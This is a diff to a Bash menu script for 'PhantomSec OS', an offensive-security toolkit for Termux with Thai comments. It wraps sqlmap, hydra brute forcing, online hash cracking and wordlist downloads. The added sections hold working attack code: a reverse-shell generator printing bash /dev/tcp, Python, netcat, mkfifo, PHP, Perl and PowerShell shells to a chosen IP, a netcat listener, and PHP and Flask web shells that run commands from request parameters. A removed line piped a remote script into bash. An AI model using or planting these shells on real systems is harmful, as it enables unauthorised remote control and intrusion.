@@ -1,6 +1,6 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ╔══════════════════════════════════════════════════════════════════════╗
-# ║          PhantomSec OS — Main Menu Interface v1.4.1                 ║
+# ║          PhantomSec OS — Main Menu Interface v1.4.2                 ║
 # ╚══════════════════════════════════════════════════════════════════════╝
 
 # อ่าน version จากไฟล์ VERSION แยก (เปลี่ยนได้โดย update.sh ไม่ต้องแก้ script)
@@ -10,8 +10,10 @@ _VERSION_FILE="$_SCRIPT_DIR/VERSION"
 if [ ! -f "$_VERSION_FILE" ]; then
   _VERSION_FILE="${PHANTOMSEC_DIR:-$HOME/.phantomsec}/VERSION"
 fi
-VERSION="$(cat "$_VERSION_FILE" 2>/dev/null | tr -d '[:space:]' || echo '1.4.1')"
+VERSION="$(cat "$_VERSION_FILE" 2>/dev/null | tr -d '[:space:]' || echo '1.4.2')"
 PHANTOMSEC_DIR="${PHANTOMSEC_DIR:-$HOME/.phantomsec}"
+# Ensure pip/gem/go binaries are findable
+export PATH="$PATH:$HOME/.local/bin:$HOME/go/bin"
 LOG_FILE="$PHANTOMSEC_DIR/logs/session_$(date +%Y%m%d_%H%M%S).log"
 
 # ── Colours ────────────────────────────────────────────────────────────
@@ -105,11 +107,28 @@ BANNER2
 
 # ── Status indicator ───────────────────────────────────────────────────
 tool_status() {
-  if command -v "$1" &>/dev/null; then
+  local t="$1"
+  if command -v "$t" &>/dev/null; then
     echo -e "${G}[INSTALLED]${NC}"
+  elif [ -f "$HOME/.local/bin/$t" ] || [ -f "$HOME/go/bin/$t" ] || [ -f "$PREFIX/bin/$t" ]; then
+    export PATH="$PATH:$HOME/.local/bin:$HOME/go/bin"
+    echo -e "${Y}[LOCAL]    ${NC}"
+  elif python3 -m "$t" --version &>/dev/null 2>&1; then
+    echo -e "${Y}[PIP-MOD]  ${NC}"
   else
     echo -e "${R}[MISSING]  ${NC}"
   fi
+}
+
+# ── Tool guard helper ─────────────────────────────────────────────────
+require_tool() {
+  local t="$1" inst="${2:-pkg install $1}"
+  if ! command -v "$t" &>/dev/null && [ ! -f "$HOME/.local/bin/$t" ] && [ ! -f "$HOME/go/bin/$t" ]; then
+    echo -e "  ${R}[✗] '$t' ไม่ได้ติดตั้ง${NC}"
+    echo -e "  ${C}ติดตั้ง: $inst${NC}"
+    press_enter; return 1
+  fi
+  return 0
 }
 
 # ══════════════════════════════════════════════════════════════════════
@@ -381,6 +400,7 @@ menu_web_exploit() {
 }
 
 run_sqlmap() {
+  require_tool sqlmap "pip3 install sqlmap" || return
   show_banner; draw_box "  SQLMAP" 66; echo ""
   echo -ne "  ${C}Target URL (with param, e.g. http://site.com/page?id=1):${NC} "; read -r url
   echo -e "\n  ${W}Options:${NC}"
@@ -501,6 +521,7 @@ menu_password() {
 }
 
 run_hydra() {
+  require_tool hydra "pkg install hydra" || return
   show_banner; draw_box "  HYDRA BRUTEFORCE" 66; echo ""
   echo -ne "  ${C}Target (IP/hostname):${NC} "; read -r target
   echo -e "\n  ${W}Service:${NC}"
@@ -539,10 +560,10 @@ run_hash_crack() {
   show_banner; draw_box "  HASH CRACKER (Online)" 66; echo ""
   echo -ne "  ${C}Hash to crack:${NC} "; read -r hash
   echo ""; draw_line "─" 66
-  result=$(curl -s "https://hashes.com/en/decrypt/hash?hashes=${hash}" 2>/dev/null | grep -oP 'class="result"[^>]*>\K[^<]+' | head -1 || echo "No result found")
+  result=$(curl -s --max-time 10 "https://hashes.com/en/decrypt/hash?hashes=${hash}" 2>/dev/null | grep -oP 'class="result"[^>]*>\K[^<]+' | head -1 || echo "No result found")
   echo -e "  ${G}Result: $result${NC}"
   # Fallback: try md5decrypt
-  result2=$(curl -s "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=check@email.com&code=code1" 2>/dev/null)
+  result2=$(curl -s --max-time 10 "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=check@email.com&code=code1" 2>/dev/null)
   [ -n "$result2" ] && echo -e "  ${G}MD5Decrypt: $result2${NC}"
   draw_line "─" 66; press_enter
 }
@@ -574,9 +595,9 @@ run_wordlist_mgr() {
   echo -e "  ${DC}[3]${NC} Custom download               ${DC}[0]${NC} Back"
   echo -ne "\n  ${M}▶${NC} "; read -r o
   case "$o" in
-    1) curl -L "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" -o "$PHANTOMSEC_DIR/wordlists/rockyou-top1000.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
-    2) curl -L "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt" -o "$PHANTOMSEC_DIR/wordlists/ssh-common.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
-    3) echo -ne "  ${C}URL:${NC} "; read -r url; echo -ne "  ${C}Filename:${NC} "; read -r fn; curl -L "$url" -o "$PHANTOMSEC_DIR/wordlists/$fn" ;;
+    1) curl -L --max-time 30 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" -o "$PHANTOMSEC_DIR/wordlists/rockyou-top1000.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
+    2) curl -L --max-time 30 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt" -o "$PHANTOMSEC_DIR/wordlists/ssh-common.txt" && echo -e "  ${G}[✓] Downloaded${NC}" ;;
+    3) echo -ne "  ${C}URL:${NC} "; read -r url; echo -ne "  ${C}Filename:${NC} "; read -r fn; curl -L --max-time 60 "$url" -o "$PHANTOMSEC_DIR/wordlists/$fn" ;;
   esac
   press_enter
 }
@@ -638,21 +659,82 @@ menu_wireless() {
 
 # ── 07  Reverse Shells ─────────────────────────────────────────────────
 menu_shells() {
-  show_banner; draw_box "  🐚 REVERSE SHELL GENERATOR" 66; echo ""
+  while true; do
+    show_banner; draw_box "  🐚 REVERSE SHELLS" 66; echo -e "${M}${V}${NC}"
+    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Generate Payloads${NC}              ${DIM}(bash/python/nc/php/perl)${NC}"
+    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}Start Listener${NC}                 ${DIM}(nc -lvnp)${NC}"
+    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}Web Shell Generator${NC}            ${DIM}(PHP/Python)${NC}"
+    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
+    draw_box_bottom 66
+    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
+    case "$r" in
+      1) run_revshell_gen ;;
+      2) run_nc_listener ;;
+      3) run_webshell_gen ;;
+      0) return ;;
+      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
+    esac
+  done
+}
+
+run_revshell_gen() {
+  show_banner; draw_box "  🐚 REVERSE SHELL PAYLOADS" 66; echo ""
   echo -ne "  ${C}Your IP (listener):${NC} "; read -r ip
   echo -ne "  ${C}Port:${NC} "; read -r port
+  if [ -z "$ip" ] || [ -z "$port" ]; then echo -e "  ${R}[✗] IP/Port ห้ามว่าง${NC}"; press_enter; return; fi
   echo ""; draw_line "─" 66
   echo -e "${G}[+] Bash:${NC}"
   echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
   echo -e "\n${G}[+] Python3:${NC}"
   echo "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""
-  echo -e "\n${G}[+] Netcat:${NC}"
+  echo -e "\n${G}[+] Netcat (traditional):${NC}"
   echo "nc -e /bin/bash $ip $port"
+  echo -e "\n${G}[+] Netcat (OpenBSD — no -e):${NC}"
+  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
   echo -e "\n${G}[+] PHP:${NC}"
   echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\"); ?>"
   echo -e "\n${G}[+] Perl:${NC}"
   echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
-  echo -e "\n${G}[+] Start listener:${NC}  nc -lvnp $port"
+  echo -e "\n${G}[+] PowerShell (Windows):${NC}"
+  echo "\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);..."
+  echo ""
+  echo -e "${Y}  Start listener with:${NC}  nc -lvnp $port"
+  draw_line "─" 66; press_enter
+}
+
+run_nc_listener() {
+  show_banner; draw_box "  NETCAT LISTENER" 66; echo ""
+  echo -ne "  ${C}Port to listen on [default 4444]:${NC} "; read -r port; port="${port:-4444}"
+  if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
+    echo -e "  ${R}[✗] Port ต้องเป็นตัวเลข 1-65535${NC}"; press_enter; return
+  fi
+  if ! command -v nc &>/dev/null; then
+    echo -e "  ${R}[✗] netcat ไม่ได้ติดตั้ง: pkg install netcat-openbsd${NC}"; press_enter; return
+  fi
+  echo ""; draw_line "─" 66
+  echo -e "  ${G}[*] Listening on port $port — Ctrl+C to stop${NC}"; echo ""
+  nc -lvnp "$port"
+  draw_line "─" 66; press_enter
+}
+
+run_webshell_gen() {
+  show_banner; draw_box "  WEB SHELL GENERATOR" 66; echo ""
+  echo -e "  ${W}PHP one-liner (cmd param):${NC}"
+  echo "  <?php system(\$_GET['cmd']); ?>"
+  echo ""
+  echo -e "  ${W}PHP password-protected:${NC}"
+  echo "  <?php if(md5(\$_GET['p'])=='098f6bcd4621d373cade4e832627b4f6'){system(\$_GET['cmd']);} ?>"
+  echo ""
+  echo -e "  ${W}Python3 (Flask) shell:${NC}"
+  printf '  from flask import Flask,request; app=Flask(__name__)
+'
+  printf '  @app.route("/")
+  def r(): return __import__("os").popen(request.args.get("c","id")).read()
+'
+  printf '  app.run(host="0.0.0.0",port=8080)
+'
+  echo ""
+  echo -e "  ${DIM}เพื่อการศึกษาเท่านั้น — ห้ามใช้กับระบบที่ไม่ได้รับอนุญาต${NC}"
   draw_line "─" 66; press_enter
 }
 
@@ -766,17 +848,69 @@ menu_tool_manager() {
          press_enter ;;
       1)
         show_banner; draw_box "  TOOL STATUS" 66; echo ""
-        local tools=("nmap" "sqlmap" "hydra" "nikto" "curl" "wget" "git" "python3" "openssl" "nc" "dig" "whois" "masscan" "john" "gobuster" "nuclei" "whatweb" "aircrack-ng")
+        show_banner; draw_box "  TOOL STATUS" 66; echo ""
+        local tools=(
+          "nmap" "hydra" "sqlmap" "nikto" "nuclei" "gobuster" "whatweb"
+          "theHarvester" "aircrack-ng" "masscan" "john"
+          "curl" "wget" "git" "python3" "openssl" "nc" "dig" "whois"
+          "tcpdump" "traceroute" "ssh" "ftp" "perl" "ruby"
+          "figlet" "lolcat" "toilet" "tmux" "vim" "jq"
+        )
         for t in "${tools[@]}"; do
-          printf "  %-20s" "$t"
+          printf "  %-22s" "$t"
           tool_status "$t"
-        done; press_enter ;;
+        done
+        echo ""
+        echo -e "  ${DIM}[Y]=ติดตั้งแล้ว  [LOCAL]=local bin  [PIP-MOD]=python module  [X]=ไม่มี${NC}"
+        press_enter ;;
       2) pkg update -y && pkg upgrade -y; echo -e "\n  ${G}[✓] Updated${NC}"; press_enter ;;
-      3) pkg install -y nmap hydra sqlmap nikto curl wget git openssl-tool masscan aircrack-ng
-         pip install theHarvester nuclei 2>/dev/null || true
-         pkg install -y golang 2>/dev/null && { export PATH="$PATH:$HOME/go/bin"; go install github.com/OJ/gobuster/v3@latest 2>/dev/null; } || true
-         bash -c 'curl -fsSL https://projectdiscovery.io/nuclei.sh | bash' 2>/dev/null || true
-         echo -e "\n  ${G}[✓] Done${NC}"; press_enter ;;
+      3) show_banner; draw_box "  INSTALL MISSING TOOLS" 66; echo ""
+         # pkg tools — ติดตั้งแต่ละตัว ถ้าล้มเหลวข้ามไป
+         for _t in nmap nikto curl wget git openssl-tool netcat-openbsd tcpdump; do
+           if ! command -v "${_t//-tool/}" &>/dev/null && ! command -v "$_t" &>/dev/null; then
+             echo -ne "  ${C}[*]${NC} $_t... "
+             pkg install -y "$_t" >/dev/null 2>&1 && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม${NC}"
+           else
+             echo -e "  ${G}[✓]${NC} ${_t} (มีแล้ว)"
+           fi
+         done
+         # hydra — ต้องการ unstable-repo
+         if ! command -v hydra &>/dev/null; then
+           echo -ne "  ${C}[*]${NC} hydra (ต้องการ unstable-repo)... "
+           { pkg install -y unstable-repo >/dev/null 2>&1 && pkg install -y hydra >/dev/null 2>&1; }              && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม — รัน: pkg install hydra${NC}"
+         else
+           echo -e "  ${G}[✓]${NC} hydra (มีแล้ว)"
+         fi
+         # masscan aircrack-ng
+         for _t in masscan aircrack-ng; do
+           if ! command -v "$_t" &>/dev/null; then
+             echo -ne "  ${C}[*]${NC} $_t... "
+             pkg install -y "$_t" >/dev/null 2>&1 && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม${NC}"
+           else echo -e "  ${G}[✓]${NC} ${_t} (มีแล้ว)"; fi
+         done
+         # sqlmap — pip3 fallback
+         if ! command -v sqlmap &>/dev/null; then
+           echo -ne "  ${C}[*]${NC} sqlmap (pip3)... "
+           pip3 install sqlmap --quiet 2>/dev/null && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม — รัน: pip3 install sqlmap${NC}"
+         else echo -e "  ${G}[✓]${NC} sqlmap (มีแล้ว)"; fi
+         # theHarvester — pip3
+         if ! command -v theHarvester &>/dev/null && [ ! -f "$HOME/.local/bin/theHarvester" ]; then
+           echo -ne "  ${C}[*]${NC} theHarvester (pip3)... "
+           pip3 install theHarvester --quiet 2>/dev/null && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม${NC}"
+         else echo -e "  ${G}[✓]${NC} theHarvester (มีแล้ว)"; fi
+         # gobuster — go install
+         if ! command -v gobuster &>/dev/null && [ ! -f "$HOME/go/bin/gobuster" ]; then
+           echo -ne "  ${C}[*]${NC} gobuster (go)... "
+           { pkg install -y golang >/dev/null 2>&1 && export PATH="$PATH:$HOME/go/bin" && go install github.com/OJ/gobuster/v3@latest 2>/dev/null; }              && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม${NC}"
+         else echo -e "  ${G}[✓]${NC} gobuster (มีแล้ว)"; fi
+         # lolcat — gem
+         if ! command -v lolcat &>/dev/null; then
+           echo -ne "  ${C}[*]${NC} lolcat (gem)... "
+           gem install lolcat --no-document >/dev/null 2>&1 && echo -e "${G}✓${NC}" || echo -e "${Y}ข้าม${NC}"
+         else echo -e "  ${G}[✓]${NC} lolcat (มีแล้ว)"; fi
+         echo ""
+         echo -e "  ${G}[✓] เสร็จแล้ว — บาง tool อาจต้องติดตั้งด้วยตัวเองถ้าข้ามไป${NC}"
+         press_enter ;;
       4) local _upd_script=""
          for _loc in "$_SCRIPT_DIR/update.sh" \
                      "$HOME/distro-os-cyber-agian-on-termux/update.sh" \
@@ -878,7 +1012,7 @@ run_whatweb() {
   else
     echo -e "  ${Y}[!] WhatWeb not installed. Install with: pip install whatweb${NC}"
     echo -e "  ${C}[*] Fallback: curl fingerprint${NC}"; echo ""
-    curl -sI "$url" 2>/dev/null | grep -iE "server:|x-powered-by:|x-generator:|via:"
+    curl -sI --max-time 10 "$url" 2>/dev/null | grep -iE "server:|x-powered-by:|x-generator:|via:"
   fi
   draw_line "─" 66; press_enter
 }
@@ -898,7 +1032,7 @@ run_harvester() {
     theHarvester -d "$domain" -b "$source" 2>&1 | tee "$PHANTOMSEC_DIR/reports/harvester_$(date +%s).txt"
   else
     echo -e "  ${Y}[!] theHarvester not installed.${NC}"
-    echo -e "  ${C}Install: pip install theHarvester${NC}"
+    echo -e "  ${C}Install: pip3 install theHarvester${NC}"
     echo -e "
   ${C}[*] Quick OSINT via cert transparency:${NC}"
     curl -s "https://crt.sh/?q=%25.${domain}&output=json" 2>/dev/null \
